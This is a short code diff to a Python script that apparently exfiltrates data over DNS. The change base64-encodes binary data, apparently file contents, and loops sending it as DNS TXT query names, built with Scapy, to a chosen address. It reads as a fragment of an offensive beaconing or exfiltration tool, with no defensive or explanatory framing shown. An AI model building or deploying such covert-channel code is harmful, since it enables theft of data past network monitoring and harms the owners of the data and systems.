@@ -16,8 +16,9 @@ def read_file(file_name):
 def bin_to_str(bin_data):
     return bin_data.decode('utf-8')
         
-def send_beacon(addr,data):
+def send_beacon(addr,bin_data):
     while cond == 0:
+        data = base64.b64encode(bin_data).decode('ascii')
         pkt = IP(dst=addr)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=data))
         send(pkt)
         print("send beacon")
